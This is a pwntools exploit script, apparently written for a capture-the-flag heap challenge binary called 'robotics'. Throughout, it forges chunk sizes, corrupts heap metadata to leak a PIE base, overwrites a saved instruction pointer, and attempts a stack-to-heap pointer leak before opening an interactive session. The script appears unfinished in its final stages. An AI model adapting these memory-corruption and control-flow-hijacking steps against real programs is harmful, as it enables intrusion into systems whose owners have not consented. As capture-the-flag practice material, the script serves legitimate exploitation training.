#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./robotics
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./robotics')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def create(idx:int):
    io.sendlineafter(b'>>',str(1).encode());
    io.sendlineafter(b'>>',str(idx).encode());
    return

def add_msg(idx:int,strx:bytes):
    io.sendlineafter(b'>>',str(2).encode())
    io.sendlineafter(b'>>',strx)
    io.sendlineafter(b'>>',str(idx).encode())
    return

def read_msg(idx:int):
    io.sendlineafter(b'>>',str(3).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    io.recvuntil(b':\n')
    msg = io.recvuntil(b'1.')
    return msg[:-3]

def run(idx:int):
    io.sendlineafter(b'>>',str(4).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    return


def destroy(idx:int):
    io.sendlineafter(b'>>',str(5).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    return

io = start()
#io = remote('localhost',1557)

fake_chunk = b'A'*0x10+p64(0x8) #0x30 realsize

create(0x77)

add_msg(0x77,fake_chunk)

create(0)
create(2)

add_msg(0,b'A'*0x17)

destroy(0)

create(1)

add_msg(1,b'A'*0x17)

destroy(0)

fake_robo = b'A'*0x10+p64(0x60) 

add_msg(2,fake_robo) #spraying

add_msg(1,b'A'*0x17) #free backed of chunk 1 to overwrite size.

add_msg(0x77,p64(0x18)) #set size robo 1

leaked = b'A'*0x10+p64(0x50) #set addr to leak

create(0x50) 

add_msg(2,leaked) ## add 2 times to reallocate robo 1.
add_msg(2,leaked) ##
#addr to leak from

add_msg(0x50,b'A'*7) # set leak size to 0x8

pie_leak = int.from_bytes(read_msg(1),'little')-0x1938

print(hex(pie_leak))

destroy(0x50)

overwrite_size = b'A'*0x10+p64(0x8)

add_msg(2,overwrite_size)

safe_write = pie_leak+0x01f68

payload = b'A'*0x8+p64(safe_write)

add_msg(2,b'A'*0x17)

add_msg(0x77,p64(0x30))
add_msg(0x77,p64(0x30))


add_msg(2,b'B'*0x10)

add_msg(2,b'B'*0x28+p64(safe_write)) #overwrite 2nd robo rip

add_msg(2,b'B'*0x10+p64(0x8)) #reset size of chunk

add_msg(2,b'B'*0x28+p64(safe_write))

add_msg(0x77,p64(0x18))
add_msg(0x77,p64(0x18))

add_msg(2,b'C'*0x10+p64(0x80)) #free previous
#set to 0
create(0x90)
destroy(0x90)

add_msg(2,b'C'*0x10+p64(0x80)) # free 0x80 to set it zero  

add_msg(1,b'D'*0xf) #trigger free 0x80

add_msg(2,b'D'*0x10+p64(8))
add_msg(2,b'D'*0x10+p64(0x84)) #free 0x84 to set it sero 

add_msg(0x77,p64(0x20)) # another one
add_msg(0x77,p64(0x20))

print('try...')

add_msg(2,b'D'*0x10+p64(8))

add_msg(0x77,p64(0x20)) # another one
add_msg(0x77,p64(0x20))

add_msg(1,b'f'*0x2f) #trigger free 0x84

add_msg(0x77,p64(0x21)) # another one
add_msg(0x77,p64(0x21))

create(0x80)

add_msg(0x80,b'B'*0x18+p64(0x1c0))

#prepared to leak stack to heap

print("LEAK FROM STACK TO HEAP!!!")

#free bins
create(0xf)
add_msg(0xf,b'F'*0x6)

run(2) #leak lots of pointers from stack.

#we have corrupted primitive after leak

create(0x90)
create(0x91)
create(0x92)

#0x1f forbidden size

io.interactive()

